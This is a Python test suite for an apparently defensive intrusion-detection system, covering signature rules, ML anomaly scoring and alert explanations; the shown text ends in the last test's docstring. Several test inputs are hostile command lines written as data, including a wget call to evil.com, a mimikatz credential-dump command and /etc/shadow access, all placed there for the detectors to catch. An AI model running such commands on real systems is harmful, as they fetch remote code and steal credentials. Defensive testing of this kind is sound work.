"""
AHRAS Module 2 — Complete Test Suite
======================================
60 tests across all detection components.

  T01–T05   Feature Extractor
  T06–T20   Signature Engine (network, process, file, cloud)
  T21–T30   ML Anomaly Engine
  T31–T38   Statistical Engine
  T39–T45   XAI Explainer
  T46–T52   Hybrid Combiner (end-to-end)
  T53–T58   Dataset Generator
  T59–T60   Full pipeline integration
"""

import os
import sys
import uuid
import math
import time
import tempfile
import threading
import unittest
import numpy as np

# ── Environment setup ─────────────────────────────────────────────────────────
os.environ["AHRAS_DEV_MODE"] = "true"
os.environ["SQLITE_PATH"]    = "/tmp/ahras_m2_test.db"
os.environ["AHRAS_MODEL_DIR"]= "/tmp/ahras_m2_models"
sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from datetime import datetime, timezone

def _ts(): return datetime.now(timezone.utc).isoformat()
def _eid(): return str(uuid.uuid4())


# ── Sample event builders ─────────────────────────────────────────────────────

def _net(src_ip="192.168.1.5", dst_ip="10.0.0.1", dst_port=80,
         proto="TCP", pkts=10, byt=1500, dur=1.5,
         flags=None, u_ports=1, abuse=0):
    from normalizer.ocsf_normalizer import _norm_network
    return _norm_network({
        "event_id": _eid(), "source": "network_tap", "timestamp": _ts(),
        "src_ip": src_ip, "dst_ip": dst_ip, "src_port": 54321,
        "dst_port": dst_port, "protocol": proto,
        "packet_count": pkts, "byte_count": byt, "duration_sec": dur,
        "tcp_flags": flags or ["SYN", "ACK"], "unique_dst_ports": u_ports,
    })

def _proc(name="bash", parent_name="systemd", username="user", cmdline="bash"):
    from normalizer.ocsf_normalizer import _norm_process
    return _norm_process({
        "event_id": _eid(), "source": "host_agent", "event_type": "process_spawn",
        "timestamp": _ts(), "hostname": "host", "pid": 9999, "name": name,
        "exe": f"/bin/{name}", "cmdline": cmdline, "username": username,
        "parent_pid": 1000, "parent_name": parent_name,
    })

def _file(path="/home/u/doc.txt", entropy=3.5, high=False):
    from normalizer.ocsf_normalizer import _norm_file
    return _norm_file({
        "event_id": _eid(), "source": "host_agent", "event_type": "file_write",
        "timestamp": _ts(), "hostname": "host", "filepath": path,
        "entropy": entropy, "high_entropy": high,
        "sha256": "aa" * 32 if high else "",
    })

def _cloud(action="s3:GetObject", sev="low", user="alice@corp.com",
           src_ip="10.0.0.1", error=None):
    from normalizer.ocsf_normalizer import _norm_cloud
    return _norm_cloud({
        "event_id": _eid(), "source": "cloud_adapter", "event_type": "cloud_api_call",
        "timestamp": _ts(), "provider": "aws", "action": action,
        "severity_hint": sev, "user_identity": user, "source_ip": src_ip,
        "region": "us-east-1", "user_agent": "aws-cli", "request_parameters": {},
        "error_code": error,
    })


# ─────────────────────────────────────────────────────────────────────────────
# T01–T05: Feature Extractor
# ─────────────────────────────────────────────────────────────────────────────

class T01_FeatureExtractorNetwork(unittest.TestCase):
    def test_returns_correct_dimension(self):
        from detection.feature_extractor import extract
        vec = extract(_net())
        self.assertIsNotNone(vec)
        self.assertEqual(len(vec), 18)

    def test_no_nan_or_inf(self):
        from detection.feature_extractor import extract
        vec = extract(_net())
        self.assertFalse(np.any(np.isnan(vec)))
        self.assertFalse(np.any(np.isinf(vec)))

    def test_all_features_non_negative(self):
        from detection.feature_extractor import extract
        vec = extract(_net())
        self.assertTrue(np.all(vec >= 0))

    def test_port_risk_high_for_suspicious_port(self):
        from detection.feature_extractor import extract
        # RDP port 3389 should have high port risk
        vec = extract(_net(dst_port=3389))
        # dst_port_risk is index 5
        self.assertGreater(vec[5], 0.5)

    def test_port_risk_low_for_https(self):
        from detection.feature_extractor import extract
        vec = extract(_net(dst_port=443))
        self.assertLess(vec[5], 0.3)


class T02_FeatureExtractorProcess(unittest.TestCase):
    def test_dimension_correct(self):
        from detection.feature_extractor import extract
        vec = extract(_proc())
        self.assertEqual(len(vec), 10)

    def test_suspicious_lineage_encoded(self):
        from detection.feature_extractor import extract
        vec_susp = extract(_proc(name="bash", parent_name="libreoffice"))
        vec_norm = extract(_proc(name="sshd", parent_name="systemd"))
        # Index 7 = suspicious_lineage
        self.assertEqual(vec_susp[7], 1.0)
        self.assertEqual(vec_norm[7], 0.0)

    def test_shell_in_cmdline_detected(self):
        from detection.feature_extractor import extract
        vec = extract(_proc(cmdline="python3 -c 'import os; os.system(wget http://evil.com)'"))
        self.assertEqual(vec[8], 1.0)   # shell_execution_indicator


class T03_FeatureExtractorFile(unittest.TestCase):
    def test_dimension_correct(self):
        from detection.feature_extractor import extract
        vec = extract(_file())
        self.assertEqual(len(vec), 8)

    def test_high_entropy_encoded(self):
        from detection.feature_extractor import extract
        vec = extract(_file(entropy=7.9, high=True))
        self.assertGreater(vec[0], 0.9)   # entropy_norm
        self.assertEqual(vec[1], 1.0)      # high_entropy_flag
        self.assertEqual(vec[2], 1.0)      # ransomware_indicator

    def test_ransomware_extension(self):
        from detection.feature_extractor import extract
        vec = extract(_file(path="/home/u/photo.jpg.enc", entropy=7.9, high=True))
        self.assertEqual(vec[3], 1.0)    # ransomware_extension


class T04_FeatureExtractorCloud(unittest.TestCase):
    def test_dimension_correct(self):
        from detection.feature_extractor import extract
        vec = extract(_cloud())
        self.assertEqual(len(vec), 10)

    def test_critical_action_high_risk(self):
        from detection.feature_extractor import extract
        vec_crit = extract(_cloud(action="cloudtrail:StopLogging", sev="critical"))
        vec_safe = extract(_cloud(action="s3:GetObject", sev="low"))
        self.assertGreater(vec_crit[0], vec_safe[0])  # action_risk_score

    def test_high_privilege_flag(self):
        from detection.feature_extractor import extract
        vec = extract(_cloud(action="iam:CreateUser", sev="high"))
        self.assertEqual(vec[1], 1.0)   # high_privilege_action


class T05_FeatureNamesAlignment(unittest.TestCase):
    def test_names_match_vector_length(self):
        from detection.feature_extractor import extract, feature_names, FEATURE_NAMES
        for cls, names in FEATURE_NAMES.items():
            evt = {
                "ocsf_class": cls, "src_endpoint": {}, "dst_endpoint": {},
                "traffic": {}, "enrichment": {}, "actor": {"process": {}},
                "process": {}, "file": {}, "api": {}, "cloud": {},
                "actor": {"user": {}},
            }
            vec = extract({**evt, "ocsf_class": cls, "actor": {"process": {}, "user": {}},
                           "process": {}})
            if vec is not None:
                self.assertEqual(len(vec), len(names),
                                 f"Mismatch for {cls}: vec={len(vec)}, names={len(names)}")


# ─────────────────────────────────────────────────────────────────────────────
# T06–T20: Signature Engine
# ─────────────────────────────────────────────────────────────────────────────

class T06_SigPortScan(unittest.TestCase):
    def test_detects_syn_scan(self):
        from detection.signature_engine.rules import run_signature_engine
        evt = _net(pkts=1, flags=["SYN"], u_ports=200)
        hits = run_signature_engine(evt)
        types = [h.attack_type for h in hits]
        self.assertIn("port_scan", types)

    def test_normal_traffic_not_flagged(self):
        from detection.signature_engine.rules import run_signature_engine
        evt = _net(pkts=50, flags=["SYN","ACK"], u_ports=1)
        hits = run_signature_engine(evt)
        types = [h.attack_type for h in hits]
        self.assertNotIn("port_scan", types)

    def test_rule_id_correct(self):
        from detection.signature_engine.rules import run_signature_engine
        evt = _net(pkts=1, flags=["SYN"], u_ports=100)
        hits = run_signature_engine(evt)
        ids = [h.rule_id for h in hits]
        self.assertIn("NET-001", ids)

    def test_mitre_populated(self):
        from detection.signature_engine.rules import run_signature_engine
        evt = _net(pkts=1, flags=["SYN"], u_ports=100)
        hits = run_signature_engine(evt)
        scan = next((h for h in hits if h.attack_type == "port_scan"), None)
        self.assertIsNotNone(scan)
        self.assertIn("T1046", scan.mitre_technique)


class T07_SigSynFlood(unittest.TestCase):
    def test_detects_flood(self):
        from detection.signature_engine.rules import run_signature_engine
        # 5000 pkts / 1s = 5000 pps > threshold(1000)
        evt = _net(pkts=5000, dur=1.0, flags=["SYN"], src_ip="45.33.32.156")
        evt["src_endpoint"]["ip"] = "45.33.32.156"
        hits = run_signature_engine(evt)
        types = [h.attack_type for h in hits]
        self.assertIn("dos_syn_flood", types)

    def test_normal_traffic_not_flood(self):
        from detection.signature_engine.rules import run_signature_engine
        evt = _net(pkts=50, dur=10.0, flags=["SYN","ACK"])
        hits = run_signature_engine(evt)
        types = [h.attack_type for h in hits]
        self.assertNotIn("dos_syn_flood", types)


class T08_SigSSHBrute(unittest.TestCase):
    def test_detects_ssh_brute(self):
        from detection.signature_engine.rules import run_signature_engine
        evt = _net(dst_port=22, pkts=500, flags=["SYN","ACK"])
        hits = run_signature_engine(evt)
        types = [h.attack_type for h in hits]
        self.assertIn("brute_force_ssh", types)


class T09_SigThreatIntel(unittest.TestCase):
    def test_high_abuse_score_fires(self):
        from detection.signature_engine.rules import run_signature_engine
        evt = _net()
        evt["enrichment"]["abuse_score"]        = 85
        evt["enrichment"]["is_threat_intel_hit"] = True
        hits = run_signature_engine(evt)
        types = [h.attack_type for h in hits]
        self.assertIn("threat_intel_match", types)

    def test_low_abuse_does_not_fire(self):
        from detection.signature_engine.rules import run_signature_engine
        evt = _net()
        evt["enrichment"]["abuse_score"]        = 10
        evt["enrichment"]["is_threat_intel_hit"] = False
        hits = run_signature_engine(evt)
        types = [h.attack_type for h in hits]
        self.assertNotIn("threat_intel_match", types)


class T10_SigRDP(unittest.TestCase):
    def test_external_rdp_fires(self):
        from detection.signature_engine.rules import run_signature_engine
        evt = _net(dst_port=3389, src_ip="45.33.32.156")
        evt["enrichment"]["is_private"] = False
        hits = run_signature_engine(evt)
        types = [h.attack_type for h in hits]
        self.assertIn("rdp_external", types)


class T11_SigProcess(unittest.TestCase):
    def test_suspicious_lineage_fires(self):
        from detection.signature_engine.rules import run_signature_engine
        evt = _proc(name="bash", parent_name="libreoffice")
        hits = run_signature_engine(evt)
        types = [h.attack_type for h in hits]
        self.assertIn("suspicious_lineage", types)

    def test_shell_exec_fires(self):
        from detection.signature_engine.rules import run_signature_engine
        evt = _proc(cmdline="python3 -c 'import os; os.system(\"wget http://evil.com\")'")
        hits = run_signature_engine(evt)
        types = [h.attack_type for h in hits]
        self.assertIn("code_execution", types)

    def test_credential_dump_fires(self):
        from detection.signature_engine.rules import run_signature_engine
        evt = _proc(cmdline="mimikatz privilege::debug sekurlsa::logonpasswords")
        hits = run_signature_engine(evt)
        types = [h.attack_type for h in hits]
        self.assertIn("credential_dumping", types)

    def test_root_shell_fires(self):
        from detection.signature_engine.rules import run_signature_engine
        evt = _proc(name="bash", username="root")
        hits = run_signature_engine(evt)
        types = [h.attack_type for h in hits]
        self.assertIn("privilege_abuse", types)

    def test_normal_process_no_hit(self):
        from detection.signature_engine.rules import run_signature_engine
        evt = _proc(name="sshd", parent_name="systemd", username="user",
                    cmdline="sshd -D")
        hits = run_signature_engine(evt)
        self.assertEqual(hits, [])


class T12_SigFile(unittest.TestCase):
    def test_ransomware_entropy_fires(self):
        from detection.signature_engine.rules import run_signature_engine
        evt = _file(entropy=7.9, high=True)
        hits = run_signature_engine(evt)
        types = [h.attack_type for h in hits]
        self.assertIn("ransomware", types)

    def test_ransomware_critical_severity(self):
        from detection.signature_engine.rules import run_signature_engine
        evt = _file(path="/home/u/doc.pdf.enc", entropy=7.9, high=True)
        hits = run_signature_engine(evt)
        ransomware = next((h for h in hits if "ransomware" in h.attack_type), None)
        self.assertIsNotNone(ransomware)
        self.assertGreaterEqual(ransomware.severity, 4)

    def test_sensitive_file_fires(self):
        from detection.signature_engine.rules import run_signature_engine
        evt = _file(path="/etc/shadow", entropy=4.0)
        hits = run_signature_engine(evt)
        types = [h.attack_type for h in hits]
        self.assertIn("sensitive_file_access", types)

    def test_normal_file_no_hit(self):
        from detection.signature_engine.rules import run_signature_engine
        evt = _file(path="/home/u/report.docx", entropy=3.2)
        hits = run_signature_engine(evt)
        self.assertEqual(hits, [])


class T13_SigCloud(unittest.TestCase):
    def test_critical_cloud_action_fires(self):
        from detection.signature_engine.rules import run_signature_engine
        evt = _cloud(action="cloudtrail:StopLogging", sev="critical")
        hits = run_signature_engine(evt)
        types = [h.attack_type for h in hits]
        self.assertIn("cloud_defense_evasion", types)

    def test_critical_severity_5(self):
        from detection.signature_engine.rules import run_signature_engine
        evt = _cloud(action="cloudtrail:StopLogging", sev="critical")
        hits = run_signature_engine(evt)
        crit = next((h for h in hits if h.attack_type == "cloud_defense_evasion"), None)
        self.assertIsNotNone(crit)
        self.assertEqual(crit.severity, 5)

    def test_access_denied_fires(self):
        from detection.signature_engine.rules import run_signature_engine
        evt = _cloud(action="s3:GetObject", error="AccessDenied")
        hits = run_signature_engine(evt)
        types = [h.attack_type for h in hits]
        self.assertIn("cloud_enumeration", types)

    def test_safe_cloud_action_no_hit(self):
        from detection.signature_engine.rules import run_signature_engine
        evt = _cloud(action="s3:GetObject", sev="low")
        hits = run_signature_engine(evt)
        # Should be clean
        dangerous = [h for h in hits if h.severity >= 4]
        self.assertEqual(dangerous, [])


class T14_SigAllRulesCallable(unittest.TestCase):
    def test_no_rule_raises_exception(self):
        from detection.signature_engine.rules import RULE_REGISTRY
        test_events = {
            "network_activity": _net(),
            "process_activity": _proc(),
            "file_activity": _file(),
            "cloud_api": _cloud(),
        }
        for cls, rules in RULE_REGISTRY.items():
            evt = test_events.get(cls, _net())
            for rule_fn in rules:
                try:
                    rule_fn(evt)
                except Exception as e:
                    self.fail(f"Rule {rule_fn.__name__} raised: {e}")


# ─────────────────────────────────────────────────────────────────────────────
# T21–T30: ML Anomaly Engine
# ─────────────────────────────────────────────────────────────────────────────

class T21_MLBootstrap(unittest.TestCase):
    def test_bootstrap_trains_models(self):
        from detection.anomaly_engine.ml_engine import (
            bootstrap_with_normal_traffic, get_model_status, _detectors
        )
        from detection.dataset_generator import get_normal_vectors
        # Clear state for clean test
        _detectors.pop("network_activity", None)
        normals = get_normal_vectors("network_activity", n=120)
        bootstrap_with_normal_traffic("network_activity", normals)
        status = get_model_status()
        self.assertTrue(status["network_activity"]["trained"])

    def test_untrained_returns_model_trained_false(self):
        from detection.anomaly_engine.ml_engine import run_anomaly_engine, _detectors
        import numpy as np
        _detectors.pop("network_conn", None)   # ensure untrained
        vec    = np.zeros(8)
        result = run_anomaly_engine("network_conn", vec)
        self.assertFalse(result.model_trained)


class T22_MLIsolationForest(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        from detection.anomaly_engine.ml_engine import bootstrap_with_normal_traffic, _detectors
        from detection.dataset_generator import get_normal_vectors
        _detectors.pop("file_activity", None)
        normals = get_normal_vectors("file_activity", n=200)
        bootstrap_with_normal_traffic("file_activity", normals)

    def test_normal_file_low_score(self):
        from detection.anomaly_engine.ml_engine import run_anomaly_engine
        from detection.feature_extractor import extract
        vec    = extract(_file(entropy=3.2))
        result = run_anomaly_engine("file_activity", vec)
        self.assertTrue(result.model_trained)
        self.assertLess(result.isolation_score, 0.8)

    def test_ransomware_high_isolation_score(self):
        from detection.anomaly_engine.ml_engine import run_anomaly_engine
        from detection.feature_extractor import extract
        vec    = extract(_file(entropy=7.95, high=True))
        result = run_anomaly_engine("file_activity", vec)
        self.assertTrue(result.model_trained)
        # High entropy should produce higher anomaly score
        self.assertGreater(result.isolation_score, 0.3)

    def test_result_fields_present(self):
        from detection.anomaly_engine.ml_engine import run_anomaly_engine
        from detection.feature_extractor import extract
        vec    = extract(_file())
        result = run_anomaly_engine("file_activity", vec)
        self.assertIsNotNone(result.confidence)
        self.assertIsNotNone(result.reconstruction_error)
        self.assertIsNotNone(result.svm_score)
        self.assertIsNotNone(result.n_models_fired)


class T23_MLNetworkAnomalies(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        from detection.anomaly_engine.ml_engine import bootstrap_with_normal_traffic, _detectors
        from detection.dataset_generator import get_normal_vectors
        _detectors.pop("network_activity", None)
        normals = get_normal_vectors("network_activity", n=300)
        bootstrap_with_normal_traffic("network_activity", normals)

    def test_port_scan_detected_by_ml(self):
        from detection.anomaly_engine.ml_engine import run_anomaly_engine
        from detection.feature_extractor import extract
        # Extreme port scan: 500 unique ports, SYN only, 1 pkt each
        evt = _net(pkts=1, flags=["SYN"], u_ports=500, dur=0.01)
        vec = extract(evt)
        result = run_anomaly_engine("network_activity", vec)
        # Score should be notably higher for scan vs normal
        self.assertGreater(result.ensemble_score, 0.1)

    def test_ensemble_score_in_range(self):
        from detection.anomaly_engine.ml_engine import run_anomaly_engine
        from detection.feature_extractor import extract
        vec    = extract(_net())
        result = run_anomaly_engine("network_activity", vec)
        self.assertGreaterEqual(result.ensemble_score, 0.0)
        self.assertLessEqual(result.ensemble_score, 1.0)


class T24_MLAdversarialHardening(unittest.TestCase):
    def test_pgd_augment_changes_features(self):
        from detection.anomaly_engine.ml_engine import _pgd_augment
        X     = np.ones((10, 18)) * 0.5
        X_adv = _pgd_augment(X, epsilon=0.05, n_steps=3)
        self.assertFalse(np.allclose(X, X_adv))

    def test_pgd_augment_bounded(self):
        from detection.anomaly_engine.ml_engine import _pgd_augment
        X     = np.ones((20, 10)) * 0.5
        X_adv = _pgd_augment(X, epsilon=0.1)
        self.assertTrue(np.all(X_adv >= 0))  # clipped to valid range


class T25_MLAutoencoder(unittest.TestCase):
    def test_autoencoder_fits_and_errors(self):
        from detection.anomaly_engine.ml_engine import _MLPAutoencoder
        from sklearn.preprocessing import StandardScaler
        X    = np.random.default_rng(42).normal(0.5, 0.1, (100, 8))
        sc   = StandardScaler()
        Xs   = sc.fit_transform(X)
        ae   = _MLPAutoencoder(input_dim=8, hidden=24)
        ae.fit(Xs)
        errs = ae.reconstruction_errors(Xs)
        self.assertEqual(len(errs), 100)
        self.assertTrue(np.all(errs >= 0))

    def test_anomalous_sample_higher_error(self):
        from detection.anomaly_engine.ml_engine import _MLPAutoencoder
        from sklearn.preprocessing import StandardScaler
        rng  = np.random.default_rng(7)
        X    = rng.normal(0.5, 0.05, (150, 8))
        sc   = StandardScaler()
        Xs   = sc.fit_transform(X)
        ae   = _MLPAutoencoder(input_dim=8, hidden=24)
        ae.fit(Xs)
        # Normal sample
        normal_err = ae.reconstruction_errors(sc.transform(X[:5])).mean()
        # Anomalous: very different values
        X_anom = rng.uniform(5, 10, (5, 8))
        anom_err = ae.reconstruction_errors(sc.transform(X_anom)).mean()
        self.assertGreater(anom_err, normal_err)


class T26_MLAnalystFeedback(unittest.TestCase):
    def test_feedback_adds_to_buffer(self):
        from detection.anomaly_engine.ml_engine import analyst_feedback, _get_detector
        from detection.feature_extractor import extract
        _get_detector("cloud_api")._buffer.clear()
        vec = extract(_cloud())
        analyst_feedback("cloud_api", vec, is_fp=True)
        det = _get_detector("cloud_api")
        self.assertGreater(len(det._buffer), 0)
        label = det._buffer[-1][1]
        self.assertEqual(label, 0)   # FP → label normal


# ─────────────────────────────────────────────────────────────────────────────
# T31–T38: Statistical Engine
# ─────────────────────────────────────────────────────────────────────────────

class T31_StatBasicScore(unittest.TestCase):
    def setUp(self):
        from detection.statistical_engine.stat_engine import StatisticalEngine
        self.engine = StatisticalEngine()

    def test_score_returns_result(self):
        from detection.feature_extractor import extract
        vec    = extract(_net())
        result = self.engine.score(_net(), vec)
        self.assertIsNotNone(result)
        self.assertIsNotNone(result.zscore)
        self.assertIsNotNone(result.behavioral_drift)

    def test_confidence_in_range(self):
        from detection.feature_extractor import extract
        for _ in range(30):
            evt = _net()
            vec = extract(evt)
            r   = self.engine.score(evt, vec)
        self.assertGreaterEqual(r.confidence, 0.0)
        self.assertLessEqual(r.confidence, 1.0)


class T32_StatZScore(unittest.TestCase):
    def setUp(self):
        from detection.statistical_engine.stat_engine import StatisticalEngine
        self.engine = StatisticalEngine()

    def test_zscore_flags_anomaly(self):
        from detection.feature_extractor import extract
        # Establish baseline with normal traffic
        for _ in range(30):
            evt = _net(pkts=10, dur=1.0)   # ~10 pps normal
            vec = extract(evt)
            self.engine.score(evt, vec)

        # Now send a spike: 100x normal packets
        evt_spike = _net(pkts=50000, dur=1.0)
        vec_spike = extract(evt_spike)
        result    = self.engine.score(evt_spike, vec_spike)
        self.assertGreater(result.zscore, 3.0)


class T33_StatTemporalDensity(unittest.TestCase):
    def setUp(self):
        from detection.statistical_engine.stat_engine import StatisticalEngine
        self.engine = StatisticalEngine()

    def test_burst_detected(self):
        from detection.feature_extractor import extract
        # Flood the engine with events from same IP
        for _ in range(120):
            evt = _net(src_ip="10.0.0.99")
            vec = extract(evt)
            result = self.engine.score(evt, vec)
        self.assertGreaterEqual(result.temporal_density, 100)
        self.assertIn("density", " ".join(result.flags))


class T34_StatBehavioralDrift(unittest.TestCase):
    def setUp(self):
        from detection.statistical_engine.stat_engine import StatisticalEngine
        self.engine = StatisticalEngine()

    def test_drift_detected_after_behavior_change(self):
        from detection.feature_extractor import extract
        # Establish baseline: small packets to port 443
        for _ in range(30):
            evt = _net(src_ip="10.0.1.1", dst_port=443, pkts=5, byt=500, dur=0.5)
            vec = extract(evt)
            self.engine.score(evt, vec)
        # Anomaly: massive scan with completely different feature profile
        evt_drift = _net(src_ip="10.0.1.1", pkts=9999, byt=999999,
                         dur=0.1, flags=["SYN"], u_ports=500)
        vec_drift = extract(evt_drift)
        result    = self.engine.score(evt_drift, vec_drift)
        self.assertGreater(result.behavioral_drift, 0.0)

    def test_drift_near_zero_for_consistent_behavior(self):
        from detection.feature_extractor import extract
        engine = __import__("detection.statistical_engine.stat_engine",
                             fromlist=["StatisticalEngine"]).StatisticalEngine()
        ip = "10.5.5.5"
        for _ in range(40):
            evt = _net(src_ip=ip, pkts=10, byt=1500, dur=1.5)
            vec = extract(evt)
            result = engine.score(evt, vec)
        # After consistent traffic, drift should be small
        self.assertLess(result.behavioral_drift, 3.0)


class T35_StatEntityTracking(unittest.TestCase):
    def test_different_ips_tracked_separately(self):
        from detection.feature_extractor import extract
        from detection.statistical_engine.stat_engine import StatisticalEngine
        engine = StatisticalEngine()
        for _ in range(25):
            engine.score(_net(src_ip="10.0.0.1"), extract(_net(src_ip="10.0.0.1")))
        for _ in range(25):
            engine.score(_net(src_ip="10.0.0.2"), extract(_net(src_ip="10.0.0.2")))
        stats = engine.get_stats()
        self.assertEqual(stats["tracked_entities"], 2)


# ─────────────────────────────────────────────────────────────────────────────
# T39–T45: XAI Explainer
# ─────────────────────────────────────────────────────────────────────────────

class T39_XAIBasic(unittest.TestCase):
    def test_returns_top_features(self):
        from detection.xai_explainer import explain
        from detection.feature_extractor import extract, feature_names
        evt  = _net(pkts=1, flags=["SYN"], u_ports=200)
        vec  = extract(evt)
        xai  = explain(vec, feature_names("network_activity"),
                       "network_activity", "port_scan",
                       sig_confidence=0.9)
        self.assertIn("top_features", xai)
        self.assertGreater(len(xai["top_features"]), 0)

    def test_explanation_text_not_empty(self):
        from detection.xai_explainer import explain
        from detection.feature_extractor import extract, feature_names
        vec = extract(_cloud(action="cloudtrail:StopLogging", sev="critical"))
        xai = explain(vec, feature_names("cloud_api"),
                      "cloud_api", "cloud_defense_evasion",
                      sig_confidence=0.95)
        self.assertIsInstance(xai["explanation_text"], str)
        self.assertGreater(len(xai["explanation_text"]), 20)

    def test_confidence_breakdown_present(self):
        from detection.xai_explainer import explain
        from detection.feature_extractor import extract, feature_names
        vec = extract(_file(entropy=7.9, high=True))
        xai = explain(vec, feature_names("file_activity"),
                      "file_activity", "ransomware",
                      sig_confidence=0.91, ml_confidence=0.74,
                      stat_confidence=0.55)
        cb = xai["confidence_breakdown"]
        self.assertAlmostEqual(cb["signature"],   0.91, places=2)
        self.assertAlmostEqual(cb["anomaly"],     0.74, places=2)
        self.assertAlmostEqual(cb["statistical"], 0.55, places=2)

    def test_contribution_sums_reasonable(self):
        from detection.xai_explainer import explain
        from detection.feature_extractor import extract, feature_names
        vec = extract(_net())
        xai = explain(vec, feature_names("network_activity"),
                      "network_activity", "normal")
        contribs = [f["contribution"] for f in xai["top_features"]]
        self.assertGreater(sum(contribs), 0)

    def test_feature_names_in_output(self):
        from detection.xai_explainer import explain
        from detection.feature_extractor import extract, feature_names
        names = feature_names("network_activity")
        vec   = extract(_net())
        xai   = explain(vec, names, "network_activity", "test")
        feat_names_out = [f["feature"] for f in xai["top_features"]]
        for fn in feat_names_out:
            self.assertIn(fn, names)


# ─────────────────────────────────────────────────────────────────────────────
# T46–T52: Hybrid Combiner
# ─────────────────────────────────────────────────────────────────────────────

class T46_CombinerBasic(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        """Bootstrap ML models once for all combiner tests."""
        from detection.anomaly_engine.ml_engine import bootstrap_with_normal_traffic, _detectors
        from detection.dataset_generator import get_normal_vectors
        for c in ["network_activity","process_activity","file_activity","cloud_api"]:
            _detectors.pop(c, None)
            bootstrap_with_normal_traffic(c, get_normal_vectors(c, n=200))

    def test_returns_detection_result(self):
        from detection.hybrid_engine import get_combiner, DetectionResult
        combiner = get_combiner()
        result   = combiner.process(_net())
        self.assertIsInstance(result, DetectionResult)

    def test_result_has_all_fields(self):
        from detection.hybrid_engine import get_combiner
        result = get_combiner().process(_net())
        for field in ["detection_id","event_id","ocsf_class","time",
                      "is_alert","confidence","severity","attack_type",
                      "engines_fired","explanation","processing_ms"]:
            self.assertIsNotNone(getattr(result, field, None), f"Missing: {field}")

    def test_confidence_in_range(self):
        from detection.hybrid_engine import get_combiner
        result = get_combiner().process(_net())
        self.assertGreaterEqual(result.confidence, 0.0)
        self.assertLessEqual(result.confidence, 1.0)

    def test_processing_time_reasonable(self):
        from detection.hybrid_engine import get_combiner
        result = get_combiner().process(_net())
        self.assertLess(result.processing_ms, 2000)  # <2s per event


class T47_CombinerPortScanAlert(unittest.TestCase):
    def test_port_scan_is_alert(self):
        from detection.hybrid_engine import get_combiner
        evt    = _net(pkts=1, flags=["SYN"], u_ports=200)
        result = get_combiner().process(evt)
        self.assertTrue(result.is_alert)
        self.assertIn("signature", result.engines_fired)

    def test_port_scan_severity_medium_or_higher(self):
        from detection.hybrid_engine import get_combiner
        evt    = _net(pkts=1, flags=["SYN"], u_ports=200)
        result = get_combiner().process(evt)
        self.assertIn(result.severity, ["MEDIUM","HIGH","CRITICAL"])


class T48_CombinerRansomwareAlert(unittest.TestCase):
    def test_ransomware_is_alert(self):
        from detection.hybrid_engine import get_combiner
        evt    = _file(path="/home/u/photo.jpg.enc", entropy=7.95, high=True)
        result = get_combiner().process(evt)
        self.assertTrue(result.is_alert)
        self.assertGreaterEqual(result.confidence, 0.4)

    def test_ransomware_severity_high(self):
        from detection.hybrid_engine import get_combiner
        evt    = _file(path="/home/u/photo.jpg.enc", entropy=7.95, high=True)
        result = get_combiner().process(evt)
        self.assertIn(result.severity, ["HIGH","CRITICAL"])


class T49_CombinerCloudCritical(unittest.TestCase):
    def test_critical_cloud_is_alert(self):
        from detection.hybrid_engine import get_combiner
        evt    = _cloud(action="cloudtrail:StopLogging", sev="critical",
                        user="unknown-external", src_ip="45.33.32.156")
        result = get_combiner().process(evt)
        self.assertTrue(result.is_alert)
        self.assertEqual(result.severity, "CRITICAL")


class T50_CombinerNormalTraffic(unittest.TestCase):
    def test_normal_traffic_low_confidence(self):
        from detection.hybrid_engine import get_combiner
        evt    = _net(pkts=15, flags=["SYN","ACK"], u_ports=1, dur=2.0)
        result = get_combiner().process(evt)
        # Normal traffic may or may not alert depending on ML state
        # but confidence should not be critical
        if result.is_alert:
            self.assertLess(result.confidence, 0.95)

    def test_safe_cloud_low_severity(self):
        from detection.hybrid_engine import get_combiner
        evt    = _cloud(action="s3:GetObject", sev="low")
        result = get_combiner().process(evt)
        if result.is_alert:
            self.assertNotEqual(result.severity, "CRITICAL")


class T51_CombinerXAIPresent(unittest.TestCase):
    def test_explanation_present_on_alert(self):
        from detection.hybrid_engine import get_combiner
        evt    = _net(pkts=1, flags=["SYN"], u_ports=200)
        result = get_combiner().process(evt)
        self.assertIsInstance(result.explanation, dict)
        self.assertIn("top_features", result.explanation)
        self.assertIn("explanation_text", result.explanation)

    def test_explanation_text_mentions_attack(self):
        from detection.hybrid_engine import get_combiner
        evt    = _file(path="/home/u/photo.jpg.enc", entropy=7.95, high=True)
        result = get_combiner().process(evt)
        text   = result.explanation.get("explanation_text", "")
        self.assertGreater(len(text), 10)


class T52_CombinerStats(unittest.TestCase):
    def test_stats_increment(self):
        from detection.hybrid_engine import get_combiner
        combiner = get_combiner()
        before   = combiner.get_stats()["total_processed"]
        for _ in range(5):
            combiner.process(_net())
        after = combiner.get_stats()["total_processed"]
        self.assertGreater(after, before)


# ─────────────────────────────────────────────────────────────────────────────
# T53–T58: Dataset Generator
# ─────────────────────────────────────────────────────────────────────────────

class T53_DatasetGenerator(unittest.TestCase):
    def test_generates_network_dataset(self):
        from detection.dataset_generator import generate_dataset
        X, y = generate_dataset("network_activity", n_normal=50, n_attack=15)
        self.assertGreater(len(X), 0)
        self.assertEqual(len(X), len(y))
        self.assertIn(0, y)
        self.assertIn(1, y)

    def test_generates_all_classes(self):
        from detection.dataset_generator import generate_dataset
        for cls in ["network_activity","process_activity","file_activity","cloud_api"]:
            X, y = generate_dataset(cls, n_normal=30, n_attack=10)
            self.assertGreater(len(X), 0, f"Empty dataset for {cls}")

    def test_attack_vectors_differ_from_normal(self):
        from detection.dataset_generator import generate_dataset
        X, y = generate_dataset("file_activity", n_normal=50, n_attack=20)
        X_normal = X[y == 0]
        X_attack = X[y == 1]
        # Mean entropy (feature 0) should be higher for attacks
        self.assertGreater(X_attack[:, 0].mean(), X_normal[:, 0].mean())

    def test_no_nan_in_generated_data(self):
        from detection.dataset_generator import generate_dataset
        X, y = generate_dataset("network_activity", n_normal=100, n_attack=20)
        self.assertFalse(np.any(np.isnan(X)))

    def test_get_normal_vectors(self):
        from detection.dataset_generator import get_normal_vectors
        vecs = get_normal_vectors("cloud_api", n=50)
        self.assertGreater(len(vecs), 0)
        self.assertIsInstance(vecs[0], np.ndarray)


# ─────────────────────────────────────────────────────────────────────────────
# T59–T60: Full pipeline integration
# ─────────────────────────────────────────────────────────────────────────────

class T59_FullPipelineEndToEnd(unittest.TestCase):
    """
    Full Module 1 → Module 2 pipeline:
